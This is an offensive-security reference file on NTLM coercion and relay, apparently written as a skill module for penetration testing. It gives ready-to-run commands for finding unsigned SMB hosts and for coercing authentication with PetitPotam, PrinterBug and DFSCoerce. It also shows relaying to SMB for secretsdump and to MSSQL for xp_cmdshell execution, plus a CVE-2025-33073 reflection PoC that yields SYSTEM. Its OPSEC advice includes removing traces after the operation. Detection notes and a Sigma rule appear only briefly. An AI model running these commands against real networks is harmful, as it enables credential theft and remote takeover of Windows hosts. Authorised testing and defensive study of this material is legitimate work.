# Coercion & NTLM Relay — The Network Position View

This file covers relay from the **network-positioning** angle: finding relay-viable
hosts, forcing authentication (coercion), and the 2025 reflection class. For the
Active-Directory-target specifics (relay → LDAP RBCD/shadow-creds, relay → ADCS
ESC8, Kerberos relay CVE-2026-20929), defer to `active-directory-attack`
(references/coercion-relay.md). This skill owns: *where can I relay, and how do I
trigger it from a foothold on the wire.*

---

## 1. Map the relay surface first

A relay only works against a target that does **not enforce signing/EPA**. Enumerate
before you coerce.

```bash
# This skill's SMB-signing mapper -> emits an ntlmrelayx -tf file + flags reflection:
python3 scripts/relay_target_finder.py 10.0.0.0/24 -o relay_targets.txt --json surface.json

# NetExec equivalents / cross-protocol checks:
nxc smb  10.0.0.0/24 --gen-relay-list relay_targets.txt   # SMB signing:False
nxc ldap dc01 -u u -p p -M ldap-checker                   # LDAP signing/channel binding
nxc smb  10.0.0.0/24 -u u -p p -M coerce_plus             # coercion endpoint discovery
```
**RelayKing** (2025) is the dedicated auditor: it checks SMB signing/CBT, HTTP/HTTPS/
MSSQL/LDAP/LDAPS EPA, RPC auth, and flags PetitPotam/PrinterBug/DFSCoerce/WebDAV,
NTLMv1, and **CVE-2025-33073** reflection candidates, ranking relay paths by severity.

| Target proto | Gate (must be OFF/weak) | What you get |
|---|---|---|
| SMB | SMB signing not required | exec (psexec-style), SAM/secrets dump, SOCKS |
| LDAP/LDAPS | LDAP signing / channel binding off | RBCD, shadow creds, add computer (→ AD skill) |
| HTTP ADCS | EPA off on certsrv | machine cert → auth as machine (ESC8 → AD skill) |
| MSSQL | EPA off | `xp_cmdshell` RCE |
| WinRM | — | session as relayed user |

---

## 2. Coercion — force a target to authenticate to you

If you can't wait for organic auth, coerce it. All trigger an outbound NTLM/Kerberos
auth from the victim to an attacker-controlled host.

```bash
# MS-EFSRPC  (PetitPotam) — file-encryption RPC; classic DC coercion
python3 PetitPotam.py -d corp.local -u user -p 'Pass' <LISTENER> <TARGET>

# MS-RPRN    (PrinterBug / SpoolSample) — print spooler; needs Spooler running
python3 printerbug.py corp.local/user:'Pass'@<TARGET> <LISTENER>

# MS-DFSNM   (DFSCoerce) — DFS namespace mgmt; works when EFSR is patched
python3 DFSCoerce.py -d corp.local -u user -p 'Pass' <LISTENER> <TARGET>

# WebClient/WebDAV coercion -> auth NOT protected by SMB signing (relay to LDAP!)
#   force WebClient start with a searchConnector-ms, then:
python3 PetitPotam.py -pipe all <LISTENER>@80/print <TARGET>    # @80 = HTTP/WebDAV

# Mass-trigger every method at once (NetExec coerce_plus or RelayKing --coerce-all):
nxc smb <TARGET> -u user -p 'Pass' -M coerce_plus -o METHOD=all LISTENER=<LISTENER>
```

**Coercion is "by design"** — Microsoft treats these RPC calls as features. The
defensive lever is the **RPC Filter** (`netsh rpc filter`) blocking MS-EFSR/MS-DFSNM/
MS-RPRN interfaces, plus signing on the relay target.

---

## 3. NTLM relay — execute

```bash
# Relay to SMB (loot/exec) with SOCKS so you can reuse the session:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
#   then drive sessions:
proxychains nxc smb <TARGET> -u user -p '' --shares      # uses relayed auth
proxychains impacket-secretsdump 'corp.local/user'@<TARGET>

# Relay to MSSQL -> xp_cmdshell RCE:
impacket-ntlmrelayx -t mssql://<SQL_IP> -smb2support \
  -q "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"

# Trigger from another window:
python3 PetitPotam.py -d corp.local -u user -p 'Pass' <RELAY_IP> <COERCE_TARGET>
```

---

## 4. CVE-2025-33073 — NTLM reflection → SYSTEM  ★ current (Jun 2025)

### Theory
A logical flaw in the Windows SMB **client** (`mrxsmb.sys`) that **bypasses the
post-MS08-068 reflection mitigations**. Microsoft labels it EoP, but it is
effectively *authenticated remote command execution as SYSTEM on any host that does
not enforce SMB signing.*

### Mechanism
1. Any AD user can add an **A record** in AD-integrated DNS → create a record whose
   name encodes/marshals so the SMB client treats the listener as a **local** call.
2. Coerce the target (PetitPotam/PrinterBug/DFSCoerce) to authenticate to that
   crafted name.
3. The SMB challenge sets "Negotiate Local Call"; the auth is reflected back to the
   originating machine. With signing off, you get a `NT AUTHORITY\SYSTEM` SMB session
   on the target → dump SAM/LSASS, exec, pivot.

```bash
# PoC (mverschu/CVE-2025-33073) — add the marshalled DNS record, then coerce:
#   1. add DNS A record (dnstool / bloodyAD) pointing the crafted name at attacker
python3 dnstool.py -u 'corp\user' -p 'Pass' -a add -r '<MARSHALLED_NAME>' \
        -d <ATTACKER_IP> <DC_IP>
#   2. run the reflection listener, then coerce the target to it
python3 cve-2025-33073.py -d corp.local -u user -p 'Pass' -t <TARGET> \
        --coerce-method petitpotam
#   3. -> SYSTEM SMB session on <TARGET> if signing not enforced
```

**Depth Security extension:** with SIGN/SEAL stripped from the packet it is sometimes
possible to relay reflected SMB → **LDAPS** even where the MIC normally blocks it —
widening impact beyond SMB-only.

### Detection
- 4624/4648 **NTLM logon to self** (source == destination host) — the reflection tell.
- New AD DNS A record created by a non-DNS-admin user, immediately followed by
  coercion RPC (EFSR/RPRN/DFSNM) and a self-NTLM logon.
- Sysmon EID 3 outbound 445 from a server to a host that resolves to a freshly added
  DNS record. The Jun-2025 patch validates DNS names during SMB auth — detect on
  marshalled/odd DNS structures.
```yaml
title: NTLM Reflection (CVE-2025-33073) Self-Authentication
logsource: { product: windows, service: security }
detection:
  ntlm_self: { EventID: 4624, AuthenticationPackageName: 'NTLM' }
  same_host: { WorkstationName: '%Computer%', IpAddress: '%LocalIp%' }
  condition: ntlm_self and same_host
```

### OPSEC
- Requires a **signing:False** target — pre-flight with `relay_target_finder.py`.
- The crafted DNS A record persists in AD DNS — **delete it** post-op (`dnstool -a remove`).
- Coercion RPC is logged on the target. Patch (Jun 10 2025) + SMB signing both kill
  it; note in report that signing alone neutralizes this 0-day (defense-in-depth).

---

## References
- Synacktiv, "NTLM reflection is dead, long live NTLM reflection! — CVE-2025-33073"
  (2025), synacktiv.com.
- Depth Security, "Using NTLM Reflection to Own Active Directory (CVE-2025-33073)."
- RBT Security / Forestall / Ampcus Cyber CVE-2025-33073 analyses (2025).
- MSRC CVE-2025-33073 advisory; Microsoft June 2025 Patch Tuesday.
- CVE-2025-55234 (SMB Server EPA/signing relay hardening, Sep 2025) — context for
  server-side relay exposure.
- MITRE ATT&CK T1557.001 (NTLM relay), T1187 (Forced Authentication).
- RelayKing (2025) NTLM-relay exposure auditor.
